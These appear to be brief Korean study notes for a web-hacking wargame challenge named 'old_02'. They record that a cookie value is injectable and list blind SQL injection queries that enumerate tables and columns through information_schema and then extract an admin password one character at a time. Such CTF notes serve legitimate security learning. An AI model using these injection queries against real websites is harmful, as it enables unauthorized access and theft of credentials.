<details>
    <summary>python code</summary>

    from pwn import *



## old_02





cookie에 여러 값 테스트

sql injection 가능

information_schema 를 이용하여

-테이블 개수 : select count(table_name) from information_schema.tables where table_schema=database()

-테이블 이름 길이 : select length(table_name) from information_schema.tables where table_schema=database() limit 0,1

-테이블 이름: select ascii(substring(table_name, 1, 1)) from information_schema.tables where table_schema=database() limit 0,1



-컬럼 개수 : select count(column_name) from information_schema.columns where table_name="admin_area_pw"

-컬럼 이름 길이: select length(column_name) from information_schema.columns where table_name="admin_area_pw" limit 0,1

-컬럼 이름 : select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name="admin_area_pw" limit 0,1

-패스워드

select count(pw) from admin_area_pw

select length(pw) from admin_area_pw limit 0,1

select ascii(substring(pw, 1,1)) from admin_area_pw limit 0,1

